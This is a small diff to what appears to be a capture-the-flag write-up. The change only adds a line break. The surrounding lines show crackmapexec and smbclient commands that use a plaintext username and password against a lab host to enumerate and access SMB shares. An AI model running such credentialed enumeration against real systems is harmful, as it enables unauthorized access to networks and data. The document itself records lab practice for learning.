@@ -150,7 +150,7 @@ crackmapexec winrm 10.10.10.182 -u r.thompson -p rY4n5eva
 ```
 
 Only smb option was available: </br>
-```crackmapexec smb -u r.thompson -p rY4n5eva --shares 10.10.10.182``` </br>
+```crackmapexec smb -u r.thompson -p rY4n5eva --shares 10.10.10.182``` </br> </br>
 **Shares Enumeration:** </br>
 ```bash
 smbclient --user r.thompson //10.10.10.182/data rY4n5eva
